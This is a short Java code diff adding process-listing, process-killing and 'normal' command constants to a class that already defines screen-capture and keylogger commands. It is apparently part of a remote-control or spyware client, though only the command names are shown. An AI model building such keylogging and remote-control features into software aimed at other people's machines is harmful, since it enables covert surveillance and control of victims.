@@ -13,4 +13,7 @@ public class Command {
     public static final String COMMAND_CLIENT_SYSTEM_INFO = "client_system_info";
     public static final String COMMAND_CLIENT_SCREEN = "/screen";
     public static final String COMMAND_KEYLOGGER = "/keylogger";
+    public static final String COMMAND_PROCESS = "/process";
+    public static final String COMMAND_END_PROCESS = "/end_process";
+    public static final String COMMAND_NORMAL = "/normal";
 }
